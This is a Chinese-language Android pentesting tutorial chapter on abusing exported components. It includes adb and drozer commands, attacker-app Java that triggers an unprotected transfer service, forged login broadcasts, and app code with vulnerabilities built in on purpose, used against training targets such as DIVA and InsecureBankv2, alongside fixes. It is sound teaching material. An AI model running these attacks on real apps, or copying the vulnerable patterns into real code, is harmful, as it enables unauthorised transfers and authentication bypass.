# Ch 3 — exported 元件濫用

> **目標**：把「元件被 export 出去」這件事從抽象概念變成你能動手打的洞。你會學到怎麼用 Manifest + drozer 系統化枚舉一個 App 的 exported Activity / Service / Receiver，怎麼直接啟動內部 Activity 繞過登入畫面、怎麼濫用一個沒保護的 Service、怎麼對 Receiver 偽造廣播，以及「缺 permission 保護」到底缺在哪。這章是 Part 2 的地基，後面 Ch 4–6 全是它的變形與加深。

> **環境**：AVD（Android 13 / API 33，x86_64，可 root），drozer（含 agent APK），`adb`、`apktool`、`jadx`。靶場用 **DIVA**、**InsecureBankv2**、**AndroGoat**。凡是 drozer/adb 的執行輸出都標「**未實測，理論預期行為**」並附驗證步驟——本 repo 的建構沙箱沒有 Android/drozer；能用 Python 驗的邏輯（例如 exported 的預設判定）標「**實際輸出**」。

## 為什麼需要這個？

一個 App 對外的攻擊面，八成從「哪些元件對別的 App 開放」開始。Android 的四大元件（Activity / Service / BroadcastReceiver / ContentProvider）本來是設計給 App 內部用的，但只要開發者把某個元件標成 `exported`（或不小心讓它預設 exported），**任何裝在同一台裝置上的其他 App 都能呼叫它**——不需要 root、不需要漏洞、就是正常的 IPC 呼叫。

這意味著什麼？意味著你寫一個只有 20 行的攻擊 App，就能：直接跳進本該登入後才看得到的付款畫面、叫醒一個「轉帳 Service」幫你轉帳、送一個假的「登入成功」廣播騙 App 相信你已驗證。這些不是理論——DIVA、InsecureBankv2 這些靶場裡就是這樣埋的，真實 App 裡到 2026 年還在大量出現。

Ch 2 教你「元件是什麼、Manifest 長什麼樣」，這章教你「元件哪裡會漏、怎麼把漏洞打出來」。這是把逆向能力變成漏洞產出的第一步。

## 先建立直覺：exported 是一道門，預設開不開很關鍵

先在腦中建立一個模型。把一個 App 想成一棟房子，四大元件是房子裡的房間。`exported` 就是「這個房間的門有沒有開向街道」：

```
        別的 App（攻擊者）             你的 App（victim）
     ┌──────────────────┐         ┌───────────────────────────────┐
     │  evil.apk         │         │  com.victim                    │
     │                   │  Intent │  ┌──────────────────────────┐ │
     │  startActivity()──┼────────▶│  │ LoginActivity (exported) │◀┼─ 街道門開著：任何 App 能敲
     │  startService() ──┼────────▶│  │ TransferService(exported)│ │
     │  sendBroadcast()──┼────────▶│  │ SmsReceiver   (exported) │ │
     │                   │    ✗    │  ├──────────────────────────┤ │
     │                   │  被擋   │  │ InternalActivity         │◀┼─ 街道門關著（not exported）：
     │                   │         │  │   (not exported)         │ │  只有同 App 內能開
     │                   │         │  └──────────────────────────┘ │
     └──────────────────┘         └───────────────────────────────┘
              │
              └── 全部在同一台裝置上，evil.apk 是使用者裝的一般 App，沒有特殊權限
```

三件事要刻進腦子：

1. **exported 的元件 = 對整台裝置上所有 App 開放的 API**。你要用「這是一個公開 API」的眼光審它：它有沒有做權限檢查？有沒有假設「呼叫我的一定是自己 App」？
2. **「不 exported」不代表安全**，只代表「跨 App 不能直接呼叫」。後面 Ch 4 的 intent redirection 就是繞過這道牆——借一個 exported 元件去打內部元件。
3. **exported 的預設值是隨 API 版本變的**，而且變過一次很重要的（下面馬上講）。搞錯預設值，你會漏掉一整類洞，或誤報一堆不存在的洞。

## 底層機制：exported 什麼時候是 true？

`exported` 這個屬性的預設值不是「總是 false」，這是最多人搞錯的地方。規則是：

```
元件的 exported 最終值怎麼決定？

  ┌─ Manifest 明確寫了 android:exported="true"/"false"  ──▶ 用寫的值
  │
  └─ Manifest 沒寫 android:exported
        │
        ├─ 元件「有」intent-filter ──────────────────────▶ 預設 exported = TRUE
        │                                                    （系統認為你想被外部呼叫）
        └─ 元件「沒有」intent-filter ─────────────────────▶ 預設 exported = FALSE
```

也就是說：**一個 Activity 只要掛了 `<intent-filter>`（哪怕只是為了接 deeplink 或某個 action），在沒有明確寫 `exported` 的情況下，它就是對外開放的**。無數 App 的漏洞來自「我加了個 intent-filter 讓它能接 deeplink，忘了它同時也對所有 App 開放了」。

**API 31（Android 12）的重大改變**：從 targetSdk 31 起，**任何有 intent-filter 的元件，Manifest 必須顯式宣告 `android:exported`**，否則 App 直接安裝/編譯失敗。這是 Google 逼開發者面對這個決定，堵住「忘了想」這個坑。但注意兩點：

- 這只在 **targetSdk ≥ 31** 生效。大量老 App（或故意壓低 targetSdk 的）仍走舊的「有 filter 就預設 exported」規則。
- 就算被逼著寫了，開發者還是可能寫 `exported="true"`——語法上合法，語意上照樣是洞。強制宣告解決的是「忘了想」，不是「想錯了」。

我用 Python 把這條決策邏輯寫成一個判定器，跑幾個案例確認自己理解對（**實際輸出**）：

```python
def is_exported(explicit, has_intent_filter, target_sdk):
    """回傳 (exported, 說明)。explicit: True/False/None（None=Manifest沒寫）"""
    if explicit is not None:
        return explicit, "Manifest 顯式宣告"
    # 沒顯式宣告
    if target_sdk >= 31 and has_intent_filter:
        return None, "targetSdk>=31 且有 filter：安裝失敗（必須顯式宣告）"
    if has_intent_filter:
        return True, "有 intent-filter，預設 exported=true"
    return False, "無 intent-filter，預設 exported=false"

cases = [
    ("有 filter 沒寫 exported, targetSdk 30", None, True, 30),
    ("有 filter 沒寫 exported, targetSdk 33", None, True, 33),
    ("沒 filter 沒寫 exported, targetSdk 33", None, False, 33),
    ("明寫 exported=true 有 filter, targetSdk 33", True, True, 33),
]
for name, e, f, s in cases:
    val, why = is_exported(e, f, s)
    print(f"{name:42s} -> exported={str(val):5s} | {why}")
```

```
有 filter 沒寫 exported, targetSdk 30      -> exported=True  | 有 intent-filter，預設 exported=true
有 filter 沒寫 exported, targetSdk 33      -> exported=None  | targetSdk>=31 且有 filter：安裝失敗（必須顯式宣告）
沒 filter 沒寫 exported, targetSdk 33      -> exported=False | 無 intent-filter，預設 exported=false
明寫 exported=true 有 filter, targetSdk 33 -> exported=True  | Manifest 顯式宣告
```

這張表就是你審 Manifest 時心裡要跑的邏輯。看到一個元件有 filter、沒寫 exported、targetSdk 是 28——它 exported，是攻擊面。

## 枚舉：從 Manifest 到 drozer

審 exported 元件有兩條路，靜態（Manifest）和動態（drozer），兩條都要會，互相印證。

### 靜態：讀 Manifest

先 `apktool d` 把 Manifest 解出來（Ch 2 學過，它是 binary XML，unzip 出來看不懂）。你在找的東西：

```xml
<!-- 這幾個都是攻擊面 -->
<activity android:name=".LoginActivity" android:exported="true">
    <intent-filter> ... </intent-filter>
</activity>

<!-- 沒寫 exported 但有 filter，targetSdk<31 → 也是 exported -->
<activity android:name=".PaymentActivity">
    <intent-filter>
        <action android:name="com.victim.OPEN_PAYMENT"/>
    </intent-filter>
</activity>

<service android:name=".TransferService" android:exported="true"/>

<receiver android:name=".SmsReceiver" android:exported="true">
    <intent-filter><action android:name="android.provider.Telephony.SMS_RECEIVED"/></intent-filter>
</receiver>
```

審的時候三個問句：**(1) 它 exported 嗎？**（套上面那張決策表）**(2) 它有沒有 `android:permission` 保護？**（下面講）**(3) 它做的事值不值得打？**（跳過登入、轉帳、寫檔）。

### 動態：drozer

drozer 是 WithSecure 的元件攻擊瑞士刀。它由裝在 AVD 上的 **agent APK**（`com.withsecure.dz` 或舊版 `com.mwr.dz`）加上你電腦上的 console 組成，透過 adb port forward 連起來。它的殺手鐧是**它幫你把「決策表」跑完**——只列給你「真正對外開放」的元件，不用自己一個個推。

啟動與連線（**未實測，理論預期行為**——沙箱無 Android/drozer）：

```bash
# 1. 裝好 agent APK 後，在 AVD 上開 agent 的 embedded server（App 內按鈕，或）
adb shell am start -n com.withsecure.dz/.activities.MainActivity
# 2. host 端 port forward
adb forward tcp:31415 tcp:31415
# 3. 連上 console
drozer console connect
```

連上後，最常用的枚舉指令：

```
# 找有哪些 package（模糊搜 victim）
dz> run app.package.list -f victim

# 看一個 package 的攻擊面總覽（列出 exported 的 activity/service/receiver/provider 數量）
dz> run app.package.attacksurface com.victim

# 列出 exported 的 activity（drozer 已幫你套過 exported 決策規則）
dz> run app.activity.info -a com.victim

# service / receiver 同理
dz> run app.service.info -a com.victim
dz> run app.broadcast.info -a com.victim
```

`app.package.attacksurface` 的代表性輸出（**未實測，理論預期行為**）：

```
Attack Surface:
  3 activities exported
  1 broadcast receivers exported
  1 services exported
  2 content providers exported
```

**驗證步驟**（你在自己 AVD 上跑）：裝好 drozer agent 與靶 App，跑 `app.activity.info -a <pkg>`，把它列出的 exported activity 清單跟你 `apktool d` 讀 Manifest 手推的清單對照。兩邊應該一致；不一致通常是你把 exported 決策規則套錯了（多半忘了「有 filter 沒寫 exported、targetSdk<31」也算 exported）。這個對照本身就是把上面那張決策表刻進手感的最好練習。

## 範例一：直接啟動內部 Activity 繞過登入

這是 exported Activity 最經典的洞。很多 App 的邏輯長這樣：`LoginActivity` 驗證通過後，`startActivity` 跳到 `DashboardActivity` 或 `PaymentActivity`。開發者心裡假設「使用者一定是先過 Login 才會到 Dashboard」——但如果 `DashboardActivity` 是 exported 的，攻擊者可以**直接啟動它，跳過整個 Login**。

漏洞版 Manifest（targetSdk 30，`DashboardActivity` 有個 deeplink filter，順手就 exported 了）：

```xml
<!-- 漏洞點：有 intent-filter、沒寫 exported、targetSdk<31 → 預設 exported=true -->
<activity android:name=".DashboardActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="myapp" android:host="dashboard"/>
    </intent-filter>
</activity>
```

漏洞版 `DashboardActivity`（Java，語法正確，**漏洞點已標**）：

```java
public class DashboardActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dashboard);
        // 漏洞點：這裡「假設」使用者一定過了 Login 才進得來，
        // 完全沒檢查登入狀態（例如沒讀 session token、沒查 isLoggedIn()）。
        // 但 Activity 是 exported 的，攻擊者能直接啟動，繞過 LoginActivity。
        loadUserBalance();      // 直接顯示帳戶餘額
    }
}
```

攻擊：用 adb 或 drozer 直接啟動它。用 adb（**未實測，理論預期行為**）：

```bash
# 直接指名啟動內部 activity，不經過 launcher/login
adb shell am start -n com.victim/.DashboardActivity
```

用 drozer：

```
dz> run app.activity.start --component com.victim com.victim.DashboardActivity
```

**預期行為**：Dashboard 畫面直接亮起來，顯示帳戶餘額——你沒登入。**驗證步驟**：在 AVD 裝好 InsecureBankv2 或你自寫的靶，先正常走一次 Login 確認流程；然後 `adb shell am start -n <pkg>/.DashboardActivity` 看能不能繞過。若被擋（例如 Activity 內有 `if(!isLoggedIn()) finish();`），那它就不是這個洞——這正是「exported ≠ 一定可利用」的邊界，見下方失敗案例。

**邊界 / 失敗案例**：如果 `DashboardActivity` 在 `onCreate` 開頭有 `if (!SessionManager.isLoggedIn()) { startActivity(LoginActivity); finish(); return; }`，那即使 exported，直接啟動也會被彈回登入。這時「exported」只是理論攻擊面，不構成可利用漏洞。報告時要誠實區分「exported（暴露）」與「可繞過認證（可利用）」——把前者當後者報是新手最常見的誤報。

## 範例二：濫用 exported Service

Service 是背景幹活的元件，沒有 UI。一個 exported 且沒權限保護的 Service，等於一個「任何 App 都能命令它幹活」的後台。危險在於 Service 常做重要的事：轉帳、發送資料、寫檔、跟伺服器同步。

漏洞版（`TransferService` exported，靠 Intent extra 決定轉帳對象與金額，**漏洞點已標**）：

```xml
<service android:name=".TransferService" android:exported="true"/>
```

```java
public class TransferService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // 漏洞點 1：exported=true 且無 android:permission，任何 App 都能啟動我。
        // 漏洞點 2：完全信任 Intent 帶進來的參數，不驗呼叫者是誰。
        String to     = intent.getStringExtra("to_account");
        long   amount = intent.getLongExtra("amount", 0);
        BankApi.transfer(to, amount);   // 直接執行轉帳
        return START_NOT_STICKY;
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
```

攻擊 App 的核心（Java，攻擊者這端）：

```java
Intent i = new Intent();
i.setComponent(new ComponentName("com.victim", "com.victim.TransferService"));
i.putExtra("to_account", "attacker-account-999");
i.putExtra("amount", 100000L);
startService(i);   // 借 victim 的身份與已登入 session 執行轉帳
```

用 drozer 打（**未實測，理論預期行為**）：

```
dz> run app.service.start --component com.victim com.victim.TransferService \
      --extra string to_account attacker-999 --extra long amount 100000
```

**為什麼這能得手**：Service 跑在 victim App 的進程裡，用的是 victim 已建立的登入 session（cookie / token 都在 victim 這邊）。攻擊 App 自己沒有 victim 的 session，但它**借 victim 的手**去轉帳——這已經帶到 Ch 4 confused deputy 的味道了。**邊界**：如果 Service 內部有 `if (checkCallingPermission(...) != GRANTED) return;` 或用 `getCallingUid()` 驗來源，就打不動。多數靶場故意不驗，真實 App 則參差。

## 範例三：對 Receiver 偽造廣播

BroadcastReceiver 接收系統或 App 的廣播事件。一個 exported Receiver，任何 App 都能對它 `sendBroadcast` 一個**偽造的**事件。危險場景：App 用一個內部廣播當「狀態變更通知」（例如 `com.victim.LOGIN_SUCCESS`、`com.victim.PREMIUM_UNLOCKED`），而 Receiver 收到就更新狀態——攻擊者偽造這個廣播，就能偽造狀態。

漏洞版（`AuthReceiver` exported，收到廣播就標記已登入，**漏洞點已標**）：

```xml
<receiver android:name=".AuthReceiver" android:exported="true">
    <intent-filter><action android:name="com.victim.LOGIN_SUCCESS"/></intent-filter>
</receiver>
```

```java
public class AuthReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        // 漏洞點：exported + 無 permission，任何 App 都能發這個 action。
        // 且盲信廣播 extra 帶的 userId，就把 App 狀態改成「已登入」。
        String userId = intent.getStringExtra("userId");
        SessionManager.markLoggedIn(userId);   // 偽造登入成功
    }
}
```

攻擊（adb，**未實測，理論預期行為**）：

```bash
adb shell am broadcast -a com.victim.LOGIN_SUCCESS \
    -n com.victim/.AuthReceiver --es userId admin
```

drozer：

```
dz> run app.broadcast.send --action com.victim.LOGIN_SUCCESS \
      --component com.victim com.victim.AuthReceiver --extra string userId admin
```

**預期**：App 認為 `admin` 已登入。**邊界**：如果 Receiver 檢查 `intent.getPackage()` 是不是自己、或這個廣播應該是 `LocalBroadcastManager`（App 進程內廣播，跨 App 送不到）發的，就打不動。**這帶出一個重要修法**：內部狀態通知應該用 `LocalBroadcastManager`（已 deprecated，改用 `LiveData`/流內事件）或加 signature-level permission，而不是走全域廣播——全域廣播天生是公開的。

## 缺 permission 保護：洞的根源

上面三個範例的共同根源，是「exported 了、卻沒加 `android:permission` 保護」。Android 允許你在元件上宣告一個 permission，呼叫者必須持有它才能呼叫：

```xml
<!-- 定義一把自訂 permission，protectionLevel=signature 表示只有同簽名的 App 能拿到 -->
<permission android:name="com.victim.permission.INTERNAL"
            android:protectionLevel="signature"/>

<!-- Service 要求呼叫者持有這把 permission -->
<service android:name=".TransferService" android:exported="true"
         android:permission="com.victim.permission.INTERNAL"/>
```

`protectionLevel="signature"` 是關鍵：它表示「只有用**同一把簽名 key** 簽的 App 才能被授予這把 permission」。攻擊者的 App 是自己簽的，拿不到，於是呼叫被系統擋下。這是「元件必須對外開放、但只想開放給自己家的其他 App」時的正確做法（自訂 permission 的坑 Ch 13 深講，包括 `signature` 為什麼比 `normal`/`dangerous` 可靠）。

沒有這層保護時，exported 元件就是裸奔的公開 API。你審 App 時的判定：**exported == true 且 android:permission 為空（或 protectionLevel 是 normal/dangerous 這種不夠強的）→ 標為攻擊面，進去看它做什麼**。

## 對比與取捨

| 元件 | exported 被濫用能幹嘛 | 典型危害 | 主要防護 |
|---|---|---|---|
| **Activity** | 直接啟動內部畫面 | 繞過登入、跳過付費牆、觸發敏感操作 | 每個 Activity 自驗登入狀態 + `android:permission` |
| **Service** | 命令它幹背景活 | 借身份轉帳/上傳/寫檔 | `android:permission` (signature) + 驗 `getCallingUid` |
| **Receiver** | 偽造廣播事件 | 偽造狀態、注入假資料、觸發邏輯 | 內部事件用 LocalBroadcast/流內事件；或 signature permission |
| **ContentProvider** | 讀寫資料 | SQLi / 任意檔案讀取（Ch 6 專章） | `exported=false` 或 path/URI 權限控管 |

| 判斷 | exported=false（不 export） | exported=true + signature permission | exported=true 無保護 |
|---|---|---|---|
| 跨 App 可呼叫 | 否（僅同 App/同 UID） | 是，但限同簽名 | **是，任何 App** |
| 適合 | 純內部元件 | 開放給自家 App 群（如主 App + 外掛） | ⚠️ 幾乎沒有正當理由這樣裸奔 |
| 攻擊面 | 低（要靠 Ch4 借道） | 低（除非攻擊者能同簽名） | **高，本章主戰場** |

## 踩雷集錦

1. **把「exported」當「可利用」報告**：exported 只是「暴露」，元件內部可能還有認證檢查（範例一的失敗案例）。一定要實測「打得動」才算洞。反過來，`exported=false` 也不代表絕對安全——Ch 4 會借道打它。
2. **忘了「有 filter 就預設 exported」（targetSdk<31）**：只盯 `android:exported="true"` 的元件，漏掉一堆「有 filter、沒寫 exported、targetSdk 舊」的隱性 exported 元件。用 drozer 的 `app.activity.info` 幫你把決策規則跑完，別純手推。
3. **在 API 31+ App 上套舊規則**：targetSdk≥31 的 App，有 filter 的元件**一定**顯式寫了 exported（不寫裝不上）。看到明寫 `exported="true"` 別以為是 drozer 誤判——是開發者真的開了。
4. **忽略 `android:permission` 的 protectionLevel**：元件加了 permission 不等於安全。如果 `protectionLevel="normal"`，任何 App 只要在 Manifest 宣告 `uses-permission` 就自動拿到，形同虛設。只有 `signature`（同簽名）才真的擋外人。
5. **只用 drozer 不讀 Manifest（或反之）**：drozer 給你「跑起來對外開放的元件」，Manifest 給你「開發者的意圖與元件在做什麼」。兩邊對照才完整——drozer 列出洞、Manifest 告訴你這個洞值不值得打（它是登入畫面還是關於頁面）。

## 進階：再往深一層

- **`getCallingUid()` / `getCallingPackage()` 的可信度**：Service 用 `Binder.getCallingUid()` 驗來源，這在 Binder 交易期間是**核心可信**的（UID 由 kernel 填，偽造不了）。但 `getCallingPackage()`（尤其在 Activity 的 `getCallingActivity()`）在某些啟動方式下會是 null 或可被繞過。驗來源優先用 UID/signature，不要只比對 package name 字串。
- **`intent-filter` 的 action 撞名與優先權**：多個 App 註冊同一個 action 時，隱式 Intent 可能被別的 App 接走。這是 Ch 7（deeplink 劫持）的引子——exported 的 filter 不只讓別人呼叫你，也可能讓別人**冒充**你去接系統或其他 App 發的 Intent。
- **`android:permission` 的 TOCTOU 與 sticky broadcast**：sticky broadcast（已 deprecated）會被系統保留，權限檢查時機微妙；有序廣播（ordered broadcast）中，先收到的 Receiver 能改寫或中止結果。這些老機制在維護老 App 時仍會遇到。
- **exported ContentProvider 的 `grantUriPermission`**：Provider 可以臨時把某個 URI 的存取權「借」給別的 App（配合 `FLAG_GRANT_READ_URI_PERMISSION`）。用得對是安全設計，用錯就是把內部檔案 URI 借給攻擊者——Ch 6 專講。

## 動手練習

1. 對 InsecureBankv2 跑 `apktool d`，手動讀 Manifest，套本章的 exported 決策表列出你認為所有 exported 的 Activity/Service/Receiver。再用 drozer 的 `app.package.attacksurface` 與 `app.activity.info -a` 對照，找出你手推漏掉或多算的，回頭想是哪條規則套錯了。
2. 在 InsecureBankv2 或 DIVA 上，用 `adb shell am start -n <pkg>/<內部Activity>` 嘗試直接啟動一個「本該登入後才能到」的畫面。若成功，這就是範例一的洞；若被彈回登入，讀它的 smali/Java 找出擋你的那行認證檢查——這是「exported ≠ 可利用」的實證。
3. 自己寫一個 20 行的攻擊 App（或用 drozer 的 `app.broadcast.send`），對一個 exported Receiver 偽造廣播，觀察 victim App 的反應（logcat 看 `onReceive` 有沒有被觸發）。體會「任何 App 都能發這個廣播」的實感。

## 本章重點整理

- **exported 元件 = 對整台裝置所有 App 開放的公開 API**，要用審 API 的眼光看它有沒有認證/權限檢查。
- exported 的**預設值**：有 intent-filter → 預設 true；無 filter → 預設 false。**API 31 起有 filter 必須顯式宣告 exported**（但只在 targetSdk≥31 生效，老 App 仍走舊規則）。
- 三大濫用：直接啟動內部 **Activity** 繞登入；命令 exported **Service** 借身份幹活；對 exported **Receiver** 偽造廣播偽造狀態。
- 根源是**缺 `android:permission` 保護**；正解是 `protectionLevel="signature"`（同簽名才可呼叫），`normal` 形同虛設。
- **exported（暴露）≠ 可利用**：元件內部可能還有認證檢查。實測打得動才算洞，別誤報。

## 自我檢核

- [ ] 不看筆記，能講出「一個沒寫 exported 的元件」在什麼條件下是 exported、什麼條件下不是
- [ ] 能說出 API 31 對 exported 宣告的強制要求，以及它「只在 targetSdk≥31 生效」的但書
- [ ] 給你一個 exported Activity，能說出「繞過登入」這個洞的原理與怎麼構造 adb/drozer PoC
- [ ] 能解釋為什麼 `protectionLevel="signature"` 擋得住攻擊者、`normal` 擋不住
- [ ] 能區分「元件 exported（暴露）」與「認證可繞過（可利用）」，知道報告時不能混為一談

## 延伸閱讀

- **[OWASP MASTG — Android Platform APIs / IPC 測試](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/)**
  - **讀哪裡**：測試 exported Activity/Service/Receiver 那幾個 test case（MASTG-TEST 系列，關鍵字 "app components" / "IPC"）
  - **和本章的關聯**：本章的枚舉與判定流程就是這些 test case 的濃縮；報告時的措辭與嚴重度分級以此為準
- **[Android 官方 — App Manifest `<activity>` / `android:exported`](https://developer.android.com/guide/topics/manifest/activity-element#exported)**
  - **讀哪裡**：`android:exported` 屬性說明與「有無 intent-filter 的預設值」那段；以及 API 31 的行為變更頁
  - **為什麼權威**：exported 預設值與 API 31 強制宣告的規則，這裡是唯一權威來源，別靠記憶
- **[drozer 官方文件與指令參考](https://github.com/WithSecureLabs/drozer)**
  - **讀哪裡**：`app.package.attacksurface`、`app.activity.info`、`app.service.start`、`app.broadcast.send` 這幾個 module 的用法
  - **前提知識**：讀過本章的枚舉段，這裡給你每個指令的完整參數
- **[HackTricks — Android Exported Activities / Services / Receivers](https://book.hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/index.html)**
  - **讀哪裡**："Exported Activities and Intents"、"Exploiting Content Providers" 前面的元件章節
  - **和本章的關聯**：可直接複製的 adb/drozer 攻擊指令合集，補齊本章的 PoC 手感

搞懂「exported 元件是公開 API」之後，下一章我們處理更陰險的一類：元件明明**不 exported**，卻被一個 exported 元件「借道」打進去。當 App 把外來的 Intent 原封不動轉發出去，它就成了幫攻擊者跑腿的「糊塗代理人」——這是 confused deputy。

→ [Ch 4 Intent redirection 與 confused deputy](./04-intent-redirection.md)
